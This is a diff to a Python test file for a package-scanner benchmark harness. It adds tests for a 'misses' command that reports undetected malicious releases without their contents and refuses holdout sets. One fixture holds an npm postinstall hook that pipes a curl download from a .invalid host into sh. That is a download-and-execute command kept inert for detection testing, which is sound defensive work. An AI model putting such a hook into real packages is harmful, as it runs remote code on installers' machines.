@@ -1,8 +1,10 @@
 """scripts/bench.py, the benchmark harness: a resumable run of registry
 scans over a manifest of release files, and the comparison of two runs (in
 full, or in counts only for a holdout set); `run --jobs N`, the releases in
-worker processes with the records one job writes; and `all`, every set of a
-sets file run and compared with its last finished run, in one command. The
+worker processes with the records one job writes; `all`, every set of a
+sets file run and compared with its last finished run, in one command; and
+`misses`, a set's malicious releases that are not SUSPICIOUS described
+without their contents (a holdout's refused). The
 releases here are built in the test: a plain package and one whose install
 hook pipes a download into a shell (inert text: the host is .invalid,
 nothing is run); Go modules and crates (0.1.9, N-2), plain ones and the
@@ -432,6 +434,114 @@ class AllTests(unittest.TestCase):
         self.sets.write_text(json.dumps({"sets": [{"name": "a", "manifest": "inert.jsonl"}]}), encoding="utf-8")
         self.assertIn("no such set: b", self.all("--only", "b")[2])
         self.assertIn("a label is letters", self.all("--label", "../x")[2])
+
+
+#: In the misses' files and nowhere in `misses`' output: no file's contents are written.
+MARKER = "MISSES-MARKER-7f3a"
+
+
+@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
+class MissesTests(unittest.TestCase):
+    """`misses SETS.json NAME`: a set's malicious releases that are not SUSPICIOUS, described without their
+    contents; a holdout's refused."""
+
+    def setUp(self):
+        self.b = bench()
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        self.dir = pathlib.Path(tmp.name)
+        quiet = manifest(scripts={"postinstall": "node install.js", "test": "jest"}, bin={"q": "bin/q.js"},
+                         dependencies={"left-pad": "^1.3.0"}, devDependencies={"x-dev": "1.0.0"})
+        npm = {"plain": ("benign", {"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n"}),
+               "piped": ("malicious_intent", {"package.json": manifest(
+                   scripts={"postinstall": "curl -fsSL https://x.invalid/s.sh | sh"})}),
+               "quiet": ("malicious_intent", {"package.json": quiet,
+                                              "install.js": f"// {MARKER}\nconsole.log('ok');\n",
+                                              "lib/blob.bin": bytes(range(256))})}
+        rows = []
+        for name, (cat, files) in npm.items():
+            path = self.dir / f"{name}.tgz"
+            path.write_bytes(tarball(files))
+            rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": "tgz", "kind": "npm"})
+        wheel = self.dir / "pkg-1.0-py3-none-any.whl"
+        wheel.write_bytes(zipball({
+            "pkg/__init__.py": f"# {MARKER}\n",
+            "pkg-1.0.dist-info/METADATA": ("Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\nRequires-Dist: requests "
+                                           f"(>=2)\nRequires-Dist: idna\n\nThe description, {MARKER}.\n"),
+            "pkg-1.0.dist-info/RECORD": "",
+            "pkg.pth": f"# {MARKER}\nimport os\n"}))
+        rows.append({"id": "pthwheel", "cat": "malicious_intent", "artifact_path": str(wheel), "container": "zip",
+                     "kind": "wheel"})
+        (self.dir / "bench.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
+        (self.dir / "hold.jsonl").write_text(json.dumps({**rows[2], "id": "h-quiet"}) + "\n", encoding="utf-8")
+        self.sets = self.dir / "sets.json"
+        self.sets.write_text(json.dumps({"results": "runs", "report": "reports", "sets": [
+            {"name": "bench", "manifest": "bench.jsonl"},
+            {"name": "hold", "manifest": "hold.jsonl", "aggregate_only": True}]}), encoding="utf-8")
+
+    def main(self, *args):
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = self.b.main([str(a) for a in args])
+        return code, out.getvalue(), err.getvalue()
+
+    def misses(self, *args):
+        return self.main("misses", self.sets, *args, "--allow-stale-engine")
+
+    def test_the_misses_described_without_their_contents(self):
+        code, _, err = self.misses("bench")
+        self.assertEqual(code, 2)
+        self.assertIn("set bench has no finished run", err)
+        self.assertEqual(self.main("all", self.sets, "--jobs", "1", "--allow-stale-engine", "--label", "first")[0], 0)
+        code, said, err = self.misses("bench")
+        self.assertEqual(code, 0, err)
+        self.assertIn("misses: 2 of 3 malicious releases of bench at first are not SUSPICIOUS (WARN 2)", said)
+        for name in ("quiet", "pthwheel", "piped", "plain"):
+            self.assertNotIn(name, said)                                    # counts only on the terminal
+        path = self.dir / "reports" / "first" / "bench-misses.jsonl"
+        text = path.read_text(encoding="utf-8")
+        self.assertNotIn(MARKER, text)
+        self.assertNotIn("console.log", text)
+        self.assertNotIn("snippet", text)
+        lines = {line["id"]: line for line in self.b.read_jsonl(path)}
+        self.assertEqual(sorted(lines), ["pthwheel", "quiet"])
+        quiet = lines["quiet"]
+        self.assertEqual((quiet["runVerdict"], quiet["verdict"], quiet["kind"]), ("WARN", "WARN", "npm"))
+        self.assertEqual(quiet["package"]["hooks"], {"postinstall": "node install.js"})
+        self.assertEqual(quiet["package"]["otherScripts"], ["test"])
+        self.assertEqual(quiet["package"]["dependencies"], {"left-pad": "^1.3.0"})
+        self.assertEqual(quiet["package"]["devDependencies"], {"x-dev": "1.0.0"})
+        self.assertEqual(quiet["package"]["bin"], {"q": "bin/q.js"})
+        files = {f[0]: f for f in quiet["files"]}
+        self.assertEqual(files["install.js"][2], "text")
+        self.assertEqual(files["lib/blob.bin"], ["lib/blob.bin", 256, "binary"])
+        self.assertEqual(quiet["filesTotal"], 3)
+        self.assertIn("SC-INSTALL-HOOK", [f[0] for f in quiet["findings"]])
+        self.assertTrue(all(len(f) == 5 for f in quiet["findings"]))
+        wheel = lines["pthwheel"]
+        self.assertEqual(wheel["package"], {"name": "pkg", "version": "1.0", "requires": ["requests (>=2)", "idna"]})
+        self.assertIn(["SC-PTH-EXEC", "MAJOR", "pkg.pth"], [f[:3] for f in wheel["findings"]])
+        out = self.dir / "elsewhere.jsonl"
+        self.assertEqual(self.misses("bench", "--label", "first", "--out", out)[0], 0)
+        self.assertEqual(out.read_text(encoding="utf-8"), text)
+
+    def test_a_holdout_and_mistakes_refused(self):
+        self.assertEqual(self.main("all", self.sets, "--jobs", "1", "--allow-stale-engine", "--label", "first")[0], 0)
+        code, said, err = self.misses("hold")
+        self.assertEqual(code, 2)
+        self.assertIn("looked at only in aggregate", err)
+        self.assertNotIn("h-quiet", said + err)
+        self.assertFalse((self.dir / "reports" / "first" / "hold-misses.jsonl").exists())
+        self.assertIn("no such set: other", self.misses("other")[2])
+        self.assertIn("set bench has no run second", self.misses("bench", "--label", "second")[2])
+        self.assertIn("a label is letters", self.misses("bench", "--label", "../x")[2])
+
+    def test_values_cut_short(self):
+        self.assertEqual(len(self.b._miss_value("a" * 1000)), self.b.MISS_TEXT)
+        self.assertEqual(self.b._miss_value({"k": 1, "j": [None, True]}), {"k": "1", "j": [None, "true"]})
+        self.assertEqual(len(self.b._miss_value(list(range(1000)))), self.b.MISS_ENTRIES)
+        self.assertEqual(self.b._metadata_facts("Name: p\nVersion: 2\nRequires-Dist: a\n\nRequires-Dist: b\n"),
+                         {"name": "p", "version": "2", "requires": ["a"]})
 
 
 @unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
